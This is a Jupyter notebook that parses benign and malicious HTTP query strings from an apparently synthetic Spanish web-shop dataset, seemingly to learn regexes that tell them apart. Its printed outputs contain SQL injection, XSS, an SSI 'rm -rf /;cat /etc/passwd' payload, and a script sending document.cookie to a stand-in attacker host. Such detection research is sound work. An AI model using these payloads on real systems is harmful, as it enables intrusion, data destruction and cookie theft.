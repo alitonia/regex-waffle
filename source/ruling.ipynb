{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import random\n",
    "\n",
    "\n",
    "def readFile(filename):\n",
    "\twith open(filename, 'r') as f:\n",
    "\t\tmatch = [word for word in f.readline().split(\", \")]\n",
    "\t\t# removing of new line from last word in M\n",
    "\t\tmatch[-1] = match[-1][:-1]\n",
    "\t\tunmatch = [word for word in f.readline().split(\", \")]\n",
    "\n",
    "\treturn match, unmatch\n",
    "\n",
    "\n",
    "# word sets M and U\n",
    "match, unmatch = readFile(\"../datasets/sample.txt\")\n",
    "\n",
    "from urllib.parse import urlparse, parse_qs\n",
    "\n",
    "#  unmatch and match uri list\n",
    "frac_match = [urlparse(x) for x in match]\n",
    "dict_match = dict()\n",
    "\n",
    "for link in frac_match:\n",
    "\tif dict_match.get(link.path) is None:\n",
    "\t\tdict_match[link.path] = dict()\n",
    "\t\tdict_match[link.path]['pos'] = [link.query]\n",
    "\telse:\n",
    "\t\ttry:\n",
    "\t\t\tif dict_match[link.path]['pos'].index(link.query):\n",
    "\t\t\t\tpass\n",
    "\t\texcept ValueError:\n",
    "\t\t\tdict_match[link.path]['pos'].append(link.query)\n",
    "\n",
    "#\n",
    "frac_unmatch = [urlparse(x) for x in unmatch]\n",
    "\n",
    "for link in frac_unmatch:\n",
    "\tif dict_match.get(link.path) is None:\n",
    "\t\tdict_match[link.path] = dict()\n",
    "\t\tdict_match[link.path]['neg'] = [link.query]\n",
    "\telif dict_match.get(link.path).get('neg') is None:\n",
    "\t\tdict_match[link.path]['neg'] = [link.query]\n",
    "\telse:\n",
    "\t\ttry:\n",
    "\t\t\tif dict_match[link.path]['neg'].index(link.query):\n",
    "\t\t\t\tpass\n",
    "\t\texcept ValueError:\n",
    "\t\t\tdict_match[link.path]['neg'].append(link.query)\n",
    "\n",
    "\n",
    "# frac_match\n",
    "\n",
    "\n",
    "def unique(list1):\n",
    "\t# initialize a null list\n",
    "\tunique_list = []\n",
    "\n",
    "\t# traverse for all elements\n",
    "\tfor x in list1:\n",
    "\t\t# check if exists in unique_list or not\n",
    "\t\tif x not in unique_list:\n",
    "\t\t\tunique_list.append(x)\n",
    "\treturn unique_list\n",
    "\n",
    "\n",
    "# # test uri\n",
    "# match, unmatch = (\n",
    "# \tdict_match['/tienda1/publico/anadir.jsp'].get('pos'),\n",
    "# \tdict_match['/tienda1/publico/anadir.jsp'].get('neg')\n",
    "# )\n",
    "\n",
    "match, unmatch = (\n",
    "\trandom.sample([x.query for x in frac_match if len(x.query) > 0], 100),\n",
    "\trandom.sample([x.query for x in frac_unmatch if len(x.query) > 0], 100),\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [
    {
     "data": {
      "text/plain": "['modo=registro&login=blount&password=sugeSto&nombre=Raian&apellidos=Suau&email=germain%40elcorteitaliano.cat&dni=78977050H&direccion=C%2F+De+La+Sabina%2C+S%2FN+8%3FB&ciudad=Betelu&cp=24224&provincia=Zamora&ntc=4761547357229973&B1=Registrar',\n 'modo=registro&login=rached&password=5n37do&nombre=Felipa&apellidos=Requena&email=goldsmith1%40esmarbella.ht&dni=28867747X&direccion=Granados+151%2C+&ciudad=Calahorra%2C+La&cp=09140&provincia=Madrid&ntc=2239348379899052&B1=Registrar',\n 'modo=entrar&login=freiwald1&pwd=fregaci5n&remember=off&B1=Entrar',\n 'modo=insertar&precio=4916&B1=Pasar+por+caja',\n 'id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito',\n 'modo=registro&login=luna&password=2un4141ali46r&nombre=Ado&apellidos=Macuare+Ribes&email=embree_chevret%40softwaremasservicio.bs&dni=59388065H&direccion=C%2F+Violeta%2C+S%2FN+9-B&ciudad=Ingenio&cp=40290&provincia=Navarra&ntc=7144713031308851&B1=Registrar',\n 'modo=registro&login=noy&password=ComPReRo&nombre=Solana&apellidos=Mu%F1iz&email=colja%40suecas.com.tel&dni=27253689T&direccion=Verema+47%2C+&ciudad=Alameda+de+Gard%F3n%2C+La&cp=23338&provincia=Segovia&ntc=6968107643811968&B1=Registrar',\n 'errorMsg=Credenciales+incorrectas',\n 'id=2',\n 'id=2',\n 'id=2',\n 'errorMsg=Credenciales+incorrectas',\n 'id=1&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito',\n 'id=2',\n 'modo=registro&login=lula&password=indIVIduo&nombre=Iracen&apellidos=Frau+Puigveh%ED&email=murphy-ekstroem%40altoguadiana.ao&dni=61128609Z&direccion=Calle+Matula%2C+S%2FN%2C+&ciudad=Cor%E7%E0&cp=42210&provincia=Burgos&ntc=7915699195068000&B1=Registrar',\n 'modo=registro&login=belia&password=ca1t01i4osO&nombre=Albicio&apellidos=Ajona+Valenzuela&email=pelle1%40906.com.aq&dni=64179446Q&direccion=Fernando+Poo+23%2C+8%3FF&ciudad=Cartaya&cp=10630&provincia=Segovia&ntc=4092441841924319&B1=Registrar',\n 'errorMsg=Credenciales+incorrectas',\n 'modo=registro&login=dick&password=8otijo&nombre=Samar&apellidos=Bonil+Schettino&email=zoldou%40stainless.tw&dni=26987451X&direccion=C%2F+Conquista+94%2C+1%3FC&ciudad=Cavia&cp=32633&provincia=Ourense&ntc=5205292790214964&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'modo=insertar&precio=3372&B1=Pasar+por+caja',\n 'modo=insertar&precio=1254&B1=Confirmar',\n 'modo=registro&login=forbes&password=m941onaria&nombre=Ido&apellidos=Sal%F3&email=delmare.seidner%40vinavilano.tn&dni=87356578W&direccion=Calle+Arins+87+4%3FE&ciudad=Ot%EDvar&cp=40315&provincia=Barcelona&ntc=3948100340900216&B1=Registrar',\n 'modo=registro&login=mal&password=atletismo&nombre=Te%F3filo&apellidos=Caama%F1o+Alayo&email=kussauer_brereton%40showcarsmadrid.com.kp&dni=82751097H&direccion=Asuncion+Castell%2C+17+&ciudad=L%F3nguida%2FLongida&cp=42193&provincia=Ciudad+Real&ntc=5453326584346927&B1=Registrar',\n 'id=1&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito',\n 'modo=registro&login=reiner&password=t0na5t44lA&nombre=Lucrecio&apellidos=Jado&email=siku%40tartasconamor.in&dni=67615328C&direccion=De+Las+Aguas%2C+196+&ciudad=Ca%F1ada+del+Hoyo&cp=37427&provincia=M%E1laga&ntc=7666460029738411&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'modo=registro&login=gollu&password=F536e6a&nombre=Cecilio&apellidos=Calafell+Palmieri&email=fierro%40porqueagel.je&dni=49317901J&direccion=Calle+Arquitectura%2C+160%2C+&ciudad=Sant+Josep+de+sa+Talaia&cp=34239&provincia=Barcelona&ntc=4091009305974951&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=6&B1=A%F1adir+al+carrito',\n 'errorMsg=Credenciales+incorrectas',\n 'id=2',\n 'modo=insertar&precio=3614&B1=Confirmar',\n 'errorMsg=Credenciales+incorrectas',\n 'modo=registro&login=lonidas&password=FUNDaMEntaLmENtE&nombre=Felipa&apellidos=Ju%E1rez&email=sarcey-fendel%40gesmahernan.de&dni=98918059G&direccion=Calle+Cosidores%2C+S%2FN%2C+&ciudad=Capileira&cp=47690&provincia=Navarra&ntc=6160253696929665&B1=Registrar',\n 'id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito',\n 'id=3&nombre=Queso+Manchego&precio=100&cantidad=4&B1=A%F1adir+al+carrito',\n 'id=2&nombre=Vino+Rioja&precio=85&cantidad=45&B1=A%F1adir+al+carrito',\n 'B2=Vaciar+carrito',\n 'id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=34&B1=A%F1adir+al+carrito',\n 'id=2',\n 'modo=registro&login=coallier&password=cer97708or7&nombre=Brian&apellidos=Montfort+Fiuza&email=cauifield%40tuviaje.com.af&dni=51620770F&direccion=Plza.+Euzkaltzandia+56+2-B&ciudad=Solana+de+los+Barros&cp=18670&provincia=Valencia&ntc=5561938510666442&B1=Registrar',\n 'errorMsg=Credenciales+incorrectas',\n 'errorMsg=Credenciales+incorrectas',\n 'modo=insertar&precio=812&B1=Confirmar',\n 'modo=registro&login=harvison&password=malacopterIGio&nombre=Dederika&apellidos=Panella+Castelv%ED&email=stief.kenworthy%40todomodelos.edu&dni=22865538L&direccion=Calle+Carcedo%2C+197%2C+&ciudad=Valdovi%F1o&cp=02311&provincia=Teruel&ntc=1133130881623845&B1=Registrar',\n 'modo=registro&login=hani&password=TONIcIdad&nombre=Pa%FAl&apellidos=Betancur&email=prell%40davidymamen.tc&dni=85533864S&direccion=Pl.+Andres+De+Soloaga+120+8%3FE&ciudad=Arb%FAcies&cp=09193&provincia=Soria&ntc=6670024896403419&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=98&B1=A%F1adir+al+carrito',\n 'errorMsg=Credenciales+incorrectas',\n 'modo=entrar&login=hazell&pwd=clam%21o&remember=on&B1=Entrar',\n 'errorMsg=Credenciales+incorrectas',\n 'modo=entrar&login=pittman&pwd=a73p3i4&remember=off&B1=Entrar',\n 'B2=Vaciar+carrito',\n 'B2=Vaciar+carrito',\n 'modo=registro&login=maurijn&password=cHOclO&nombre=Ramsey&apellidos=Baldivieso&email=brutsman%40etnics.ms&dni=53486450L&direccion=Cami+Antic+Animeta+43%2C+&ciudad=Marchagaz&cp=16192&provincia=Burgos&ntc=8651552740405089&B1=Registrar',\n 'modo=registro&login=jaswal&password=d060u2ar&nombre=Hania&apellidos=Limongi+Di%E9guez&email=hesseman.dolen%40gaudio.mu&dni=26015420M&direccion=Calle+Vallseca+123+&ciudad=Pleitas&cp=22991&provincia=Barcelona&ntc=5176682769033876&B1=Registrar',\n 'modo=registro&login=kalpak&password=tolera9lemen8e&nombre=Sixto&apellidos=Peredo+Huecas&email=byron%40vinavilano.gl&dni=21468433A&direccion=Toril%2C+171+5H&ciudad=Mu%F1opedro&cp=45790&provincia=Soria&ntc=5036144025003599&B1=Registrar',\n 'modo=insertar&precio=5290&B1=Confirmar',\n 'B2=Vaciar+carrito',\n 'modo=entrar&login=iocntrl&pwd=legadura&remember=on&B1=Entrar',\n 'id=1&nombre=Queso+Manchego&precio=100&cantidad=19&B1=A%F1adir+al+carrito',\n 'modo=entrar&login=konstanc&pwd=escenogr%E1fica&remember=off&B1=Entrar',\n 'modo=entrar&login=de_leon&pwd=599iad12a&remember=on&B1=Entrar',\n 'B2=Vaciar+carrito',\n 'errorMsg=Credenciales+incorrectas',\n 'id=2',\n 'id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito',\n 'id=2&nombre=Queso+Manchego&precio=39&cantidad=50&B1=A%F1adir+al+carrito',\n 'id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=89&B1=A%F1adir+al+carrito',\n 'modo=entrar&login=nataliya&pwd=p44m8scu6916n&remember=off&B1=Entrar',\n 'modo=registro&login=amalie&password=arlota&nombre=Fulivio&apellidos=M%F3nico+Echeverr%EDa&email=gossett%40conac.com.li&dni=42093532J&direccion=C%2F+Caceres%2C+74%2C+&ciudad=Estollo&cp=22400&provincia=Tarragona&ntc=0894971274673122&B1=Registrar',\n 'id=3&nombre=Queso+Manchego&precio=85&cantidad=20&B1=A%F1adir+al+carrito',\n 'id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87&B1=A%F1adir+al+carrito',\n 'id=2',\n 'modo=insertar&precio=8893&B1=Confirmar',\n 'B2=Vaciar+carrito',\n 'id=1',\n 'modo=entrar&login=chiaoyun&pwd=INDEMOsTrAbLe&remember=off&B1=Entrar',\n 'id=2',\n 'modo=insertar&precio=2066&B1=Confirmar',\n 'id=1',\n 'modo=entrar&login=kalila&pwd=47gent1R&remember=off&B1=Entrar',\n 'modo=insertar&precio=8916&B1=Confirmar',\n 'modo=insertar&precio=7398&B1=Pasar+por+caja',\n 'id=1',\n 'B2=Vaciar+carrito',\n 'modo=entrar&login=ravinder&pwd=%F1a04&remember=on&B1=Entrar',\n 'modo=registro&login=triantap&password=lobera&nombre=Odelia&apellidos=Moll+Aybar&email=liedtke_truhitte%40ac-activos.gob&dni=75013152D&direccion=C%2F+Murillo%2C+106+5C&ciudad=Abrucena&cp=09191&provincia=Valencia&ntc=6986219017290364&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'modo=entrar&login=patten&pwd=09ca93a4i9lar&remember=on&B1=Entrar',\n 'modo=insertar&precio=2225&B1=Pasar+por+caja',\n 'id=2&nombre=Queso+Manchego&precio=85&cantidad=67&B1=A%F1adir+al+carrito',\n 'B2=Vaciar+carrito',\n 'modo=insertar&precio=8169&B1=Confirmar',\n 'B2=Vaciar+carrito',\n 'modo=registro&login=mazanji&password=maG%FCEtO&nombre=Fredesvinda&apellidos=Matienzo+Gallifa&email=lenhart8%40raullazaro.us&dni=46704601L&direccion=Calle+Juan+De+Mena%2C+133+&ciudad=Marines&cp=06460&provincia=Girona&ntc=3945926912768707&B1=Registrar',\n 'B2=Vaciar+carrito',\n 'id=1&nombre=Vino+Rioja&precio=100&cantidad=79&B1=A%F1adir+al+carrito',\n 'modo=registro&login=space3&password=legista&nombre=Fedor&apellidos=Peguera&email=laneuville%40hangarcentrodelautomovil.sh&dni=42101588L&direccion=Escocia+197+&ciudad=Cabez%F3n+de+Pisuerga&cp=09410&provincia=Lleida&ntc=8259767534834623&B1=Registrar',\n 'modo=registro&login=cyros&password=culPada&nombre=Shaira&apellidos=Luciano+Nagel&email=sandberg%403horas.tl&dni=13082383Y&direccion=Callejon+Sierpes+128%2C+5-E&ciudad=Fern%E1n+Caballero&cp=41110&provincia=Tarragona&ntc=8729606554712430&B1=Registrar']"
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "match"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "outputs": [],
   "source": [
    "def charsInSet(wordSet):\n",
    "\tchars = []\n",
    "\n",
    "\tfor word in wordSet:\n",
    "\t\tfor c in word:\n",
    "\t\t\tif c not in chars:\n",
    "\t\t\t\tchars.append(c)\n",
    "\n",
    "\tchars.sort()\n",
    "\n",
    "\treturn chars"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['modo=registro&login=kalpak&password=tolera9lemen8e&nombre=Sixto&apellidos=Peredo+Huecas&email=byron%40vinavilano.gl&dni=21468433A&direccion=Toril%2C+171+5H&ciudad=Mu%F1opedro&cp=45790&provincia=Soria&ntc=5036144025003599&B1=Registrar', 'B2=Vaciar+carrito', 'B2=Vaciar+carrito', 'id=2', 'modo=entrar&login=nataliya&pwd=p44m8scu6916n&remember=off&B1=Entrar', 'modo=registro&login=space3&password=legista&nombre=Fedor&apellidos=Peguera&email=laneuville%40hangarcentrodelautomovil.sh&dni=42101588L&direccion=Escocia+197+&ciudad=Cabez%F3n+de+Pisuerga&cp=09410&provincia=Lleida&ntc=8259767534834623&B1=Registrar', 'modo=registro&login=mal&password=atletismo&nombre=Te%F3filo&apellidos=Caama%F1o+Alayo&email=kussauer_brereton%40showcarsmadrid.com.kp&dni=82751097H&direccion=Asuncion+Castell%2C+17+&ciudad=L%F3nguida%2FLongida&cp=42193&provincia=Ciudad+Real&ntc=5453326584346927&B1=Registrar', 'id=1&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito', 'id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito', 'id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito']\n",
      "['modo=registro&login=churas&password=8o4cu6a&nombre=Liber&apellidos=Sanges+Andr%E9u&email=benaderet%40introito.io&dni=27978102M&direccion=Paseo+Virgen+Del+Rocio+160+8%3FD&ciudad=Garganta+de+los+Montes&cpA=50867&provincia=Segovia&ntc=4002449133288786&B1=Registrar', 'id=2&nombre=Queso+Manchego&precio=39&cantidadA=2&B1=A%F1adir+al+carrito', 'errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS', 'id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E', 'modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=Cantabria&ntcA=7563981891605435&B1=Registrar', 'modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=2018&B1=Pasar+por+caja', 'modo=registro&login=michial3&password=83o3i7a374&nombre=Teodomira&apellidos=D%27Paoli+Garros&email=bessell%40ttivoni.is&dni=32124292Psessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&direccion=C%2F+Montevideo+193%2C+&ciudad=Rupi%E0&cp=39572&provincia=Burgos&ntc=8086742983774365&B1=Registrar', 'modo=registrosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=turnbull&password=sinople&nombre=Castorio&apellidos=Nal%F3n&email=cumming.lotti%40grancolisionadordehadrones.nf&dni=13641255R&direccion=C%2F+Alfambra+89%2C+&ciudad=Ayamonte&cp=04888&provincia=Salamanca&ntc=6332398372339556&B1=Registrar', 'errorMsgA=Credenciales+incorrectas', 'modo=entrar&login=tomohiro&pwd=A%2Cz%27ORAMiEn%2CTo&remember=off&B1=Entrar']\n"
     ]
    }
   ],
   "source": [
    "import random\n",
    "print(random.sample(match, 10))\n",
    "print(random.sample(unmatch, 10))"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "20\n",
      "19\n",
      "\n",
      "modo ['registro', 'entrar', 'insertar'] ['insertar<!--#exec cmd=\"rm -rf /;cat /etc/passwd\" -->', \"registro' DELETE FROM USERS\", 'registrosessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?', \"insertar','0','0','0','0');waitfor delay '0:0:15';--\"]\n",
      "\n",
      "login ['blount', 'rached', 'freiwald1', 'luna', 'noy', 'lula', 'belia', 'dick', 'forbes', 'mal'] ['adornato', 'prestipi', 'tania', 'natraj', 'swr', 'scanlan', 'hartmann', 'stokker', 'mobasher', 'messier']\n",
      "\n",
      "password ['sugeSto', '5n37do', '2un4141ali46r', 'ComPReRo', 'indIVIduo', 'ca1t01i4osO', '8otijo', 'm941onaria', 'atletismo', 't0na5t44lA'] ['m7n�fica', 'politiquer�a', 'trinar', 'aritm�tica', 'jesu$ita', '2n5fe2ta2a', 'al55nza', 'do6a3er8', 'pa32885o', 'c7b183o']\n",
      "\n",
      "nombre ['Raian', 'Felipa', 'Vino Rioja', 'Ado', 'Solana', 'Iracen', 'Albicio', 'Samar', 'Ido', 'Te�filo'] ['Tarciano', 'Fedelia', 'Sulamita', 'Nahir', 'Leon�das', 'Rasmira', 'Randolfo', 'Leandra', 'Noel Stefani', 'Nicodemo']\n",
      "\n",
      "apellidos ['Suau', 'Requena', 'Macuare Ribes', 'Mu�iz', 'Frau Puigveh�', 'Ajona Valenzuela', 'Bonil Schettino', 'Sal�', 'Caama�o Alayo', 'Jado'] ['Donnadieu Vivanco', 'Ollero Sogorb', 'Serrat', 'Lamo Gelber', 'Martag�n', 'Pavi� Pool', 'Rovirola Noiran', 'Orpez Almod�var', 'Dolce Mull-uhuar__a', 'Triola Villuend']\n",
      "\n",
      "email ['germain@elcorteitaliano.cat', 'goldsmith1@esmarbella.ht', 'embree_chevret@softwaremasservicio.bs', 'colja@suecas.com.tel', 'murphy-ekstroem@altoguadiana.ao', 'pelle1@906.com.aq', 'zoldou@stainless.tw', 'delmare.seidner@vinavilano.tn', 'kussauer_brereton@showcarsmadrid.com.kp', 'siku@tartasconamor.in'] ['dombasle@tagarautomation.ad', 'andreas6@@fest-tv.a@o', 'warbeck@tabernarinconete.tz', 'sherlock@freecreditcheck.ec', 'frankaus-erecton@creacionesacampada.lu', 'gloves@sms24h.mk', 'semmelrogge@spainpharma.zm', 'schaab@hispadis.li', 'deschamps1@11horas.my', 'galloway@rtce.gu']\n",
      "\n",
      "dni ['78977050H', '28867747X', '59388065H', '27253689T', '61128609Z', '64179446Q', '26987451X', '87356578W', '82751097H', '67615328C'] ['30585356W', '43658270S', '52485262K', '00776957V', '83255484S', '92795576Y', '73500117Ybob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org', '96068417Q', '51756068L', '35507822P']\n",
      "\n",
      "direccion ['C/ De La Sabina, S/N 8?B', 'Granados 151, ', 'C/ Violeta, S/N 9-B', 'Verema 47, ', 'Calle Matula, S/N, ', 'Fernando Poo 23, 8?F', 'C/ Conquista 94, 1?C', 'Calle Arins 87 4?E', 'Asuncion Castell, 17 ', 'De Las Aguas, 196 '] ['Calle Santo Domingo Savio 174 13-B', 'C/ Guincho, 191, 7?F', 'Calle Monges, 28, 3-F', 'C/ Antonio Machado, 1 ', 'Passatge Cala Virgilia, 147 4E', 'Calle Jose Luis De Arrese, 105 1?F', 'Pl. Aranjuez, S/N ', 'Calle Montduber 75, 12?H', 'Calle Jerusalen 18 ', 'Numero 15, 151, ']\n",
      "\n",
      "ciudad ['Betelu', 'Calahorra, La', 'Ingenio', 'Alameda de Gard�n, La', 'Cor��', 'Cartaya', 'Cavia', 'Ot�var', 'L�nguida/Longida', 'Ca�ada del Hoyo'] ['Jubrique', 'Abezames', 'Banyalbufar', 'Pe�aranda de Bracamonte', 'Castellote', 'Ger', 'Sobremunt', 'Magacela', 'Santib��ez de Valcorba', 'Castrillo de la Guare�a']\n",
      "\n",
      "cp ['24224', '09140', '40290', '23338', '42210', '10630', '32633', '40315', '42193', '37427'] ['49325', '12230', '19112', '31340', '24370', '18127', '04275', '39776', '23657', '16193']\n",
      "\n",
      "provincia ['Zamora', 'Madrid', 'Navarra', 'Segovia', 'Burgos', 'Ourense', 'Barcelona', 'Ciudad Real', 'M�laga', 'Valencia'] ['Badajoz', 'La Rioja', '�vila', 'Guip�zcoa', 'Cantabria', 'Almer�a', 'Toledo', 'Huesca', 'Salamanca', 'A Coru�a']\n",
      "\n",
      "ntc ['4761547357229973', '2239348379899052', '7144713031308851', '6968107643811968', '7915699195068000', '4092441841924319', '5205292790214964', '3948100340900216', '5453326584346927', '7666460029738411'] ['9595137071003174', '4001707460771803', '5196721943648454', '378274661282900A', '1198702099336688', '|', '9542215186041042', '1278501676319264', '6332398372339556', '3867909567368782']\n",
      "\n",
      "B1 ['Registrar', 'Entrar', 'Pasar por caja', 'A�adir al carrito', 'Confirmar'] ['Pasar por caja/', \"Confirmar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%\", \"';waitfor delay '0:0:15';--\", 'Confirmar/', 'Pasar por caja%20', '?']\n",
      "\n",
      "pwd ['fregaci5n', 'clam!o', 'a73p3i4', 'legadura', 'escenogr�fica', '599iad12a', 'p44m8scu6916n', 'INDEMOsTrAbLe', '47gent1R', '�a04'] ['veintidoseno', 'desa1a0car', '46inquet48a', 'vEnEcIANa', '4�adi3ie8to', \"A,z'ORAMiEn,To\"]\n",
      "\n",
      "remember ['off', 'on'] []\n",
      "\n",
      "precio ['4916', '85', '3372', '1254', '100', '3614', '39', '812', '5290', '8893'] ['7744', '4342', '8588', '5798', \"6541';waitfor delay '0:0:15';--\", '7641', '9874', '39/', '8789', '6244']\n",
      "\n",
      "id ['3', '2', '1'] ['bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org', '<SCRIPT>alert(\"Paros\");</SCRIPT>', \"sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>\", '2/', '3/', \"'OR'a='a\", '3<!--#exec cmd=\"rm -rf /;cat /etc/passwd\" -->', \"');waitfor delay '0:0:15';--\", \"2'INJECTED_PARAM\"]\n",
      "\n",
      "cantidad ['4', '94', '44', '6', '10', '45', '34', '98', '19', '62'] ['60', '7', '84', '32', '75', '56', '23', 'Set-cookie%3A+Tamper%3D1041264011025374727', \"','0','0','0');waitfor delay '0:0:15';--\", '64']\n",
      "\n",
      "errorMsg ['Credenciales incorrectas'] [\"Credenciales incorrectas' DELETE FROM USERS\", '<SCRIPT>alert(\"Paros\");</SCRIPT>', 'Credenciales incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E']\n",
      "\n",
      "B2 ['Vaciar carrito'] ['Vaciar carrito%3F', 'Vaciar carrito\" AND \"1\"=\"1', \"sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>\"]\n"
     ]
    }
   ],
   "source": [
    "\n",
    "match_parsed = [parse_qs(x) for x in match]\n",
    "unmatch_parsed = [parse_qs(x) for x in unmatch]\n",
    "\n",
    "_match_keys = [[t for t in x.keys()] for x in match_parsed]\n",
    "match_keys = []\n",
    "for keys in _match_keys:\n",
    "\tfor key in keys:\n",
    "\t\tif key not in match_keys:\n",
    "\t\t\tmatch_keys.append(key)\n",
    "\n",
    "match_entries = dict()\n",
    "unmatch_entries = dict()\n",
    "\n",
    "for key in match_keys:\n",
    "\tfor d in match_parsed:\n",
    "\t\tif d.get(key) is not None and match_entries.get(key) is None and ''.join(d[key]).isprintable():\n",
    "\t\t\tmatch_entries[key] = [d[key]]\n",
    "\t\telse:\n",
    "\t\t\tif d.get(key) is not None and d[key] not in match_entries[key] and ''.join(d[key]).isprintable():\n",
    "\t\t\t\tmatch_entries[key].append(d[key])\n",
    "\n",
    "\tfor d in unmatch_parsed:\n",
    "\t\tif (\n",
    "\t\t\t\tunmatch_entries.get(key) is None\n",
    "\t\t\t\tand d.get(key) is not None\n",
    "\t\t\t\tand d[key] not in (match_entries.get(key) or [])\n",
    "\t\t\t\tand ''.join(d[key]).isprintable()\n",
    "\t\t):\n",
    "\t\t\tunmatch_entries[key] = [d[key]]\n",
    "\t\telse:\n",
    "\t\t\tif (\n",
    "\t\t\t\t\td.get(key) is not None\n",
    "\t\t\t\t\tand d[key] not in (unmatch_entries.get(key) or [])\n",
    "\t\t\t\t\tand d[key] not in (match_entries.get(key) or [])\n",
    "\t\t\t\t\tand ''.join(d[key]).isprintable()\n",
    "\t\t\t):\n",
    "\t\t\t\tunmatch_entries[key].append(d[key])\n",
    "\n",
    "print(match_entries.__len__())\n",
    "print(unmatch_entries.__len__())\n",
    "\n",
    "for key in match_keys:\n",
    "\tprint('')\n",
    "\tfocused_match = [' '.join(x) for x in (match_entries.get(key) or [])]\n",
    "\tfocused_unmatch = [' '.join(x) for x in (unmatch_entries.get(key) or [])]\n",
    "\tprint(key, focused_match[:10], focused_unmatch[:10])"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}